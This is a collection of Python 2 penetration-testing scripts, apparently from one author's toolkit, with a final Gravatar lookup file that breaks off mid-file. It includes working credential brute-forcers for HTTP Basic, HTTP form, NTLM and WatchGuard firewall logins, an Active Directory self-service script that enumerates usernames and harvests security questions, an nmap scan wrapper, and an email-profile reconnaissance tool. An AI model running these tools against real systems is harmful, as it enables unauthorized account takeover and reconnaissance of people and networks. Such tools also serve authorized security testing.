__FILENAME__ = ad_self_service_miner
import requests
import re

good_re = re.compile(r'Time left for this operation')
ques_re = re.compile(r'<td align="left">(.*)\?</td>')


def check_user(username):
    s = requests.Session()
    s.verify = False
    s.get(server + '/accounts/Reset')

    data = {'userName': username,
            'DOMAIN_FLAT_NAME': domain}
    resp = s.post(server + '/accounts/PasswordSelfService', data=data)
    m = good_re.search(resp.content)

    if m is not None:
        m = ques_re.findall(resp.content)
        out.write("{0}:\n".format(username))
        for q in m:
            out.write("\t{0}?\n".format(q))
        else:
            print "{0} is invalid.".format(username)

server = 'https://server'
domain = 'DOMAIN'
out = open('ad_self_service_miner.log', 'w')

for f in open('firstnames.txt'):
    f.strip()
    for l in open('lastnames.txt'):
        l.strip()
        # Modify the user variable to match the username pattern of the target
        user = "{0}.{1}".format(f.capitalize(), l.capitalize())
        check_user(user)
        out.flush()

out.close()

########NEW FILE########
__FILENAME__ = brute_http_basic
# Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#   Redistributions of source code must retain the above copyright notice,
#   this list of conditions and the following disclaimer.
#
#   Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
#
#   Neither the name of AverageSecurityGuy nor the names of its contributors
#   may be used to endorse or promote products derived from this software
#   without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

import requests
import multiprocessing
import sys
import Queue


def worker(url, cred_queue, success_queue):
    print '[*] Starting new worker thread.'
    while True:
        # If there are no creds to test, stop the thread
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            print '[-] Credential queue is empty, quitting.'
            return

        # If there are good creds in the queue, stop the thread
        if not success_queue.empty():
            print '[-] Success queue has credentials, quitting'
            return

        # Check a set of creds. If successful add them to the success_queue
        # and stop the thread.
        auth = requests.auth.HTTPBasicAuth(creds[0], creds[1])
        resp = requests.get(url, auth=auth, verify=False)
        if resp.status_code == 401:
            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])
        else:
            print '[+] Success: {0}/{1}'.format(creds[0], creds[1])
            success_queue.put(creds)
            return


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print 'USAGE: brute_http_basic.py url userfile passfile'
        sys.exit()

    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    # Create one thread for each processor.
    for i in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=worker, args=(sys.argv[1],
                                                         cred_queue,
                                                         success_queue))
        procs.append(p)
        p.start()

    for user in open(sys.argv[2]):
        user = user.rstrip('\r\n')
        if user == '':
            continue
        for pwd in open(sys.argv[3]):
            pwd = pwd.rstrip('\r\n')
            cred_queue.put((user, pwd))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

    while not success_queue.empty():
        user, pwd = success_queue.get()
        print 'User: {0} Pass: {1}'.format(user, pwd)


########NEW FILE########
__FILENAME__ = brute_http_form
# Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#   Redistributions of source code must retain the above copyright notice,
#   this list of conditions and the following disclaimer.
#
#   Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
#
#   Neither the name of AverageSecurityGuy nor the names of its contributors
#   may be used to endorse or promote products derived from this software
#   without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

import requests
import multiprocessing
import sys
import Queue
import re
import json
import HTMLParser


# Class to parse HTML responses to find the needed hidden fields and to test
# for login success or failure.
class bruteParser(HTMLParser.HTMLParser):
    def __init__(self, fail, hidden_fields):
        HTMLParser.HTMLParser.__init__(self)
        self.hidden = {}
        self.hidden_fields = hidden_fields
        self.fail_regex = fail
        self.fail = False

    def feed(self, data):
        # Reset our fail flag before we process any data
        self.fail = False
        HTMLParser.HTMLParser.feed(self, data)

    def handle_starttag(self, tag, attr):
        if tag == 'input':
            attribs = dict(attr)
            if attribs['type'] == 'hidden':
                if attribs['name'] in self.hidden_fields:
                    self.hidden[attribs['name']] = attribs['value']

    def handle_data(self, data):
        m = self.fail_regex.search(data)

        # If we have a match, m is not None, on the fail_str then the login
        # attempt was unsuccessful.
        if m is not None:
            self.fail = True


def load_config(f):
    return json.loads(open(f).read())


def worker(login, action, parser, cred_queue, success_queue):
    print '[*] Starting new worker thread.'
    sess = requests.Session()
    resp = sess.get(login)
    parser.feed(resp.content)

    while True:
        # If there are no creds to test, stop the thread
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            print '[-] Credential queue is empty, quitting.'
            return

        # If there are good creds in the queue, stop the thread
        if not success_queue.empty():
            print '[-] Success queue has credentials, quitting'
            return

        # Check a set of creds. If successful add them to the success_queue
        # and stop the thread.
        auth = {config['ufield']: creds[0],
                config['pfield']: creds[1]}
        auth.update(parser.hidden)
        resp = sess.post(action, data=auth, verify=False)
        parser.feed(resp.content)

        if parser.fail is True:
            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])
        else:
            print '[+] Success: {0}/{1}'.format(creds[0], creds[1])
            success_queue.put(creds)
            return


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print 'USAGE: brute_http_form.py config_file'
        sys.exit()

    config = load_config(sys.argv[1])

    fail = re.compile(config['fail_str'], re.I | re.M)
    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    # Create one thread for each processor.
    for i in range(int(config['threads'])):
        p = multiprocessing.Process(target=worker,
                                    args=(config['login'],
                                          config['action'],
                                          bruteParser(fail, config['hidden']),
                                          cred_queue,
                                          success_queue))
        procs.append(p)
        p.start()

    for user in open(config['ufile']):
        user = user.rstrip('\r\n')
        if user == '':
            continue
        for pwd in open(config['pfile']):
            pwd = pwd.rstrip('\r\n')
            cred_queue.put((user, pwd))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

    while not success_queue.empty():
        user, pwd = success_queue.get()
        print 'User: {0} Pass: {1}'.format(user, pwd)

########NEW FILE########
__FILENAME__ = brute_http_ntlm
#!/usr/bin/env python
#
# Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#   Redistributions of source code must retain the above copyright notice,
#   this list of conditions and the following disclaimer.
#
#   Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
#
#   Neither the name of AverageSecurityGuy nor the names of its contributors
#   may be used to endorse or promote products derived from this software
#   without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

import requests
from requests_ntlm import HttpNtlmAuth
import multiprocessing
import sys
import Queue


def worker(url, cred_queue, success_queue, domain):
    print '[*] Starting new worker thread.'
    while True:
        # If there are no creds to test, stop the thread
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            print '[-] Credential queue is empty, quitting.'
            return

        # If there are good creds in the queue, stop the thread
        if not success_queue.empty():
            print '[-] Success queue has credentials, quitting'
            return

        # Check a set of creds. If successful add them to the success_queue
        # and stop the thread.
        user = '{0}\\{1}'.format(domain, creds[0])
        auth = HttpNtlmAuth(user, creds[1])
        resp = requests.get(url, auth=auth, verify=False)
        if resp.status_code == 200:
            print '[+] Success: {0}/{1}'.format(creds[0], creds[1])
            success_queue.put(creds)
            return
        else:
            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])


if __name__ == '__main__':
    if len(sys.argv) != 5:
        print 'USAGE: brute_http_ntlm.py url userfile passfile domain'
        sys.exit()

    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    # Create one thread for each processor.
    for i in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=worker, args=(sys.argv[1],
                                                         cred_queue,
                                                         success_queue,
                                                         sys.argv[4]))
        procs.append(p)
        p.start()

    for user in open(sys.argv[2]):
        user = user.rstrip('\r\n')
        if user == '':
            continue
        for pwd in open(sys.argv[3]):
            pwd = pwd.rstrip('\r\n')
            cred_queue.put((user, pwd))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

    while not success_queue.empty():
        user, pwd = success_queue.get()
        print 'User: {0} Pass: {1}'.format(user, pwd)


########NEW FILE########
__FILENAME__ = discover
#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
#   Redistributions of source code must retain the above copyright notice, this
#   list of conditions and the following disclaimer.
#
#   Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
#
#   Neither the name of AverageSecurityGuy nor the names of its contributors may
#   be used to endorse or promote products derived from this software without
#   specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY
# OF SUCH DAMAGE.

import sys
import subprocess
import re

#-----------------------------------------------------------------------------
# The script reads an IP address range and list of TCP ports from the command
# line and first runs an ICMP scan against all the IP addresses. Next, a SYN
# scan is run against any live IP addresses discovered during the ICMP scan.
# The SYN scan uses the TCP port list specified on the command line.
#
# Discovered IP addresses, ports, and services are formatted and written to a
# file. The raw Nmap output is also written to files using the -oA switch.
#-----------------------------------------------------------------------------

#-----------------------------------------------------------------------------
# Compiled Regular Expressions
#-----------------------------------------------------------------------------
report_re = re.compile('Nmap scan report for (.*)')
gnmap_re = re.compile('Host: (.*)Ports:')
version_re = re.compile('# Nmap 6.25 scan initiated')
host_re = re.compile('Host: (.*) .*Ports:')
ports_re = re.compile('Ports: (.*)\sIgnored State:')
os_re = re.compile('OS: (.*)\sSeq Index:')


#-----------------------------------------------------------------------------
# Functions
#-----------------------------------------------------------------------------
def run_command(cmd):
    p = subprocess.Popen(cmd.split(), stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    resp = p.stdout.read()
    warnings = p.stderr.read()
    p.stdout.close()
    p.stderr.close()

    # Return any warnings and the raw response.
    return warnings, resp


def print_warnings(warnings):
    for w in warnings.split('\n'):
        if w == '':
            continue
        print '[-] {0}'.format(w)
        if w == 'QUITTING!':
            sys.exit()


def save_targets(file_name, ips):
    print '[*] Saving live target to {0}'.format(file_name)

    out = open(file_name, 'w')
    out.write('\n'.join(ips))
    out.close()


def parse_ports(port_str, broken=False):
    '''
    The 6.25 version of Nmap broke the port format by dropping a field. If
    broken is True then assume we have 6.25 output otherwise do not.
    '''
    ports = []
    for port in port_str.split(','):
        if broken == True: 
            num, stat, proto, x, sn, serv, y = port.split('/')
        else:
            num, stat, proto, x, sn, y, serv, z = port.split('/')

        if serv == '':
            service = sn
        else:
            service = serv

        s = '{0}/{1} ({2}) - {3}'.format(proto, num.strip(), stat, service)
        ports.append(s)

    return ports


def parse_gnmap(file_name):
    hosts = {}
    broken = False
    gnmap = open('{0}.gnmap'.format(file_name), 'r')
    for line in gnmap:
        m = version_re.search(line)
        if m is not None:
            broken = True

        m = gnmap_re.search(line)
        if m is not None:
            # Get Hostname
            h = host_re.search(line)
            if h is None:
                host = 'Unknown'
            else:
                host = h.group(1)

            # Get Ports
            p = ports_re.search(line)
            if p is not None:
                ports = parse_ports(p.group(1), broken)
            else:
                ports = ''

            # Get OS
            o = os_re.search(line)
            if o is None:
                os = 'Unknown'
            else:
                os = o.group(1) 

            hosts[host] = {'os': os,
                           'ports': ports}

    gnmap.close()

    return hosts

#-----------------------------------------------------------------------------
# Main Program
#-----------------------------------------------------------------------------

#
# Parse command line options
#
usage = '''
USAGE:

discover.py IP_addresses <port_list>

Addresses must be a valid Nmap IP address range and ports must be a valid Nmap
port list. Any ports provided will be added to the default ports that are
scanned: 21, 22, 23, 25, 53, 80, 110, 119, 143, 443, 135, 139, 445, 593, 1352,
1433, 1498, 1521, 3306, 5432, 389, 1494, 1723, 2049, 2598, 3389, 5631, 5800,
5900, and 6000. The script should be run with root privileges.
'''

if len(sys.argv) == 2:
    target = sys.argv[1]
    other_ports = ''
elif len(sys.argv) == 3:
    target = sys.argv[1]
    other_ports = sys.argv[2]
else:
    print usage
    sys.exit()

#
# Setup global variables
#
ping_fname = '{0}_ping_scan'.format(target.replace('/', '.'))
target_fname = '{0}_targets.txt'.format(target.replace('/', '.'))
syn_fname = '{0}_syn_scan'.format(target.replace('/', '.'))
result_fname = '{0}_results.md'.format(target.replace('/', '.'))

ports = '21,22,23,25,53,80,110,119,143,443,135,139,445,593,1352,1433,1498,'
ports += '1521,3306,5432,389,1494,1723,2049,2598,3389,5631,5800,5900,6000'
if other_ports != '':
    ports += ',' + other_ports

#
# Run discovery scans against the address range
#
print '[*] Running discovery scan against targets {0}'.format(target)
cmd = 'nmap -sn -PE -n -oA {0} {1}'.format(ping_fname, target)
warnings, resp = run_command(cmd)
print_warnings(warnings)

ips = report_re.findall(resp)
print '[+] Found {0} live targets'.format(len(ips))

if len(ips) == 0:
    print '[-] No targets to scan. Quitting.'
    sys.exit()

save_targets(target_fname, ips)
print '[*] Ping scan complete.\n'

#
# Run full scans against each IP address.
#
print '[*] Running full scan on live addresses using ports {0}'.format(ports)
cmd = 'nmap -sS -n -A -p {0} --open '.format(ports)
cmd += '-oA {0} -iL {1}'.format(syn_fname, target_fname)
warnings, resp = run_command(cmd)
print_warnings(warnings)
print '[*] Full scan complete.\n'

#
# Parse full scan results and write them to a file.
#
print '[*] Parsing Scan results.'
hosts = parse_gnmap(syn_fname)

print '[*] Saving results to {0}'.format(result_fname)
out = open(result_fname, 'w')
for host in hosts:
    out.write(host + '\n')
    out.write('=' * len(host) + '\n\n')
    out.write('OS\n')
    out.write('--\n')
    out.write(hosts[host]['os'] + '\n\n')
    out.write('Ports\n')
    out.write('-----\n')
    out.write('\n'.join(hosts[host]['ports']))
    out.write('\n\n\n')

out.close()
print '[*] Parsing results is complete.'

########NEW FILE########
__FILENAME__ = firewarebf
#!/usr/bin/env python
# Copyright (c) 2012, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this 
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice, 
#  this list of conditions and the following disclaimer in the documentation 
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. 
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, 
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT 
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, 
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY 
# OF SUCH DAMAGE.

#
# firewarebf.py attempts to bruteforce the password on a Watchguard firewall.

import poster
import urllib2
import ssl
import re
import argparse

#-----------------------------------------------------------------------------
# Functions
#-----------------------------------------------------------------------------
def list_from_file(filename):
    tmp = []
    try:
        f = open(filename, 'r')
    except:
        print "Could not open file: %s" % f.name()

    for line in f:
        tmp.append(line.rstrip('\r\n'))

    return tmp
    
def check_user_pass(url, user, pwd, domain):
    site = url + '/wgcgi.cgi?action=fw_logon&style=fw_logon.xsl&fw_logon_type=status'
    values = {'submit' : 'Login',
              'action' : 'fw_logon',
              'style' : 'fw_logon_progress.xsl',
              'fw_logon_type' : 'logon'}
              
    values['fw_username'] = user
    values['fw_password'] = pwd
    values['fw_domain'] = domain
	
    datagen, headers = poster.encode.multipart_encode(values)
    req = urllib2.Request(site, datagen, headers)
    resp = urllib2.urlopen(req).read()
    if re.search('Authentication Failed:', resp):
        print "Failed: %s, %s" % (u, p)
    else:
        print resp
        print "Success: %s, %s" % (u, p)


#-----------------------------------------------------------------------------
# Main Program
#-----------------------------------------------------------------------------
# Setup poster module
poster.streaminghttp.register_openers()

#Parse command line arguments using argparse
desc = """firewarebf.py attempts to bruteforce the password on a Watchguard
firewall. You will need to provide the IP address of the firewall, the login 
domain, and the login credentials to test.
"""
parser = argparse.ArgumentParser(description=desc)
parser.add_argument('server', action='store', default='192.168.0.1',
                    help="Ip address of server (Default: 192.168.0.1)")

passgroup = parser.add_mutually_exclusive_group(required=True)
passgroup.add_argument('-p', action='store', default=None, metavar='passfile',
    help='List of passwords. Will use default usernames of admin and status.')
passgroup.add_argument('-f', action='store', default=None,
                       metavar='userpassfile',
                       help='List of user:pass combinations.')

parser.add_argument('-d', action='store', default='Firebox-DB',
                   metavar='domain', help='Login domain (Default: Firebox-DB')
parser.add_argument('--http', action='store_true', default=False,
                    help='Use an HTTP connection instead of HTTPS')

args = parser.parse_args()

# Set the URL based on --http flag
if args.http:
    url = "http://" + args.server
else:
    url = "https://" + args.server
    
# Test the passwords
if args.f:
    for c in list_from_file(args.f):
        u, p = c.split(":")
        check_user_pass(url, u, p, args.d)
else:
    users = ['admin', 'status']
    pwds = list_from_file(args.p)
    for u in users:
        for p in pwds:
            check_user_pass(url, u, p, args.d)


########NEW FILE########
__FILENAME__ = gnmap2md
#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
#   Redistributions of source code must retain the above copyright notice, this
#   list of conditions and the following disclaimer.
#
#   Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
#
#   Neither the name of AverageSecurityGuy nor the names of its contributors may
#   be used to endorse or promote products derived from this software without
#   specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY
# OF SUCH DAMAGE.

import re
import sys

#-----------------------------------------------------------------------------
# Compiled Regular Expressions
#-----------------------------------------------------------------------------
gnmap_re = re.compile('Host: (.*)Ports:')
version_re = re.compile('# Nmap 6.25 scan initiated')
host_re = re.compile('Host: (.*) .*Ports:')
ports_re = re.compile('Ports: (.*)\sIgnored State:')
os_re = re.compile('OS: (.*)\sSeq Index:')


#-----------------------------------------------------------------------------
# Functions
#-----------------------------------------------------------------------------
def parse_ports(port_str, broken=False):
    '''
    The 6.25 version of Nmap broke the port format by dropping a field. If
    broken is True then assume we have 6.25 output otherwise do not.
    '''
    ports = []
    for port in port_str.split(','):
        if broken == True: 
            num, stat, proto, x, sn, serv, y = port.split('/')
        else:
            num, stat, proto, x, sn, y, serv, z = port.split('/')

        if serv == '':
            service = sn
        else:
            service = serv

        s = '{0}/{1} ({2}) - {3}'.format(proto, num.strip(), stat, service)
        ports.append(s)

    return ports


def parse_gnmap(file_name):
    hosts = {}
    broken = False
    gnmap = open('{0}'.format(file_name), 'r')
    for line in gnmap:
        m = version_re.search(line)
        if m is not None:
            broken = True

        m = gnmap_re.search(line)
        if m is not None:
            # Get Hostname
            h = host_re.search(line)
            if h is None:
                host = 'Unknown'
            else:
                host = h.group(1)

            # Get Ports
            p = ports_re.search(line)
            if p is not None:
                ports = parse_ports(p.group(1), broken)
            else:
                ports = ''

            # Get OS
            o = os_re.search(line)
            if o is None:
                os = 'Unknown'
            else:
                os = o.group(1) 

            hosts[host] = {'os': os,
                           'ports': ports}

    gnmap.close()

    return hosts


#-----------------------------------------------------------------------------
# Main Program
#-----------------------------------------------------------------------------

#
# Parse command line options
#
usage = '''
USAGE:

gnmap2md.py gnmap_file_name md_file_name

Converts a Nmap gnmap formatted file into a Markdown formatted file.
'''

if len(sys.argv) != 3:
    print usage
    sys.exit()

#
# Setup global variables
#
gnmap_fname = sys.argv[1]
result_fname = sys.argv[2]

#
# Parse full scan results and write them to a file.
#
print '[*] Parsing Scan results.'
hosts = parse_gnmap(gnmap_fname)

print '[*] Saving results to {0}'.format(result_fname)
out = open(result_fname, 'w')
for host in hosts:
    out.write(host + '\n')
    out.write('=' * len(host) + '\n\n')
    out.write('OS\n')
    out.write('--\n')
    out.write(hosts[host]['os'] + '\n\n')
    out.write('Ports\n')
    out.write('-----\n')
    out.write('\n'.join(hosts[host]['ports']))
    out.write('\n\n\n')

out.close()
print '[*] Parsing results is complete.'

########NEW FILE########
__FILENAME__ = gravatar
#!/usr/bin/env python
# Copyright (c) 2013, LCI Technology Group, LLC
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice,
#  this list of conditions and the following disclaimer in the documentation
#  and/or other materials provided with the distribution.
#
#  Neither the name of LCI Technology Group, LLC nor the names of its
#  contributors may be used to endorse or promote products derived from this
#  software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

#
# Gravatar.py takes a file with a list of email address, one on each line, and
# searches Gravatar for information about the email address. If address is
# registered with Gravatar, then selected data points are extracted from the
# Gravatar profile.
#
import sys
import hashlib
import requests

#------------------------------------------------------------------------------
# Functions
#------------------------------------------------------------------------------
def get_gravatar(email):
    '''
    Generate an MD5 hash of the email address and query the Gravatar server
    for the profile associated with that hash. Return the associated data in
    JSON format.
    '''
    email_hash = hashlib.md5(email).hexdigest()
    resp = requests.get('http://gravatar.com/{0}.json'.format(email_hash))
    data = {}
    if resp.status_code == 200:
        try:
            print '[+] Found email address {0}.'.format(email) 
            data = resp.json()
        except ValueError:
            print '[-] Could not convert response to JSON.'
    elif resp.status_code == 404:
        pass
    else:
        print '[-] Received status {0}'.format(resp.status_code)

    return data


def get_profile(email):
    '''
    Parse the Gravatar JSON profile to extract specific data points if they
    exist. Return the list of parsed profile entries.
    '''
    prof = get_gravatar(email)
    
    entries = []
    if prof != {}:
        for e in prof['entry']:
            entry = {}
            entry['email'] = email
            entry['username'] = e.get('preferredUsername', '')
            entry['location'] = e.get('currentLocation', '')
            entry['name'] = get_name(e.get('name'))
            entry['accounts'] = get_accounts(e.get('accounts'))
            entries.append(entry)

    return entries


def get_name(name):
    '''
    Extract the formatted name from a name dictionary.
    '''
    if name is None:
        return ''
    elif name == []:
        return ''
    else:
        return name.get('formatted', '')


def get_accounts(data):
    '''
    Build a list of accounts by extracting specific data points if they exist.
    Return the list of accounts extracted.
    '''
    accounts = []
    if data is None:
        return accounts
    else:
        for a in data:
            account = {}
            account['username'] = a.get('username', '')
            account['url'] = a.get('url', '')
            accounts.append(account) 

    return accounts


def print_profile(profile):
    '''
    Print the profile in a readable format.
    '''
    for p in profile:
        print p['email']
        print '-' * len(p['email'])
        print 'Name: {}'.format(p['name'])
        print 'Username: {}'.format(p['username'])
        print 'Location: {}'.format(p['location'])
        print 'Accounts:'
        for account in p['accounts']:
            print '  Username: {}'.format(account['username'])
            print '  URL: {}'.format(account['url'])
        print



#-----------------------------------------------------------------------------
# Main Program
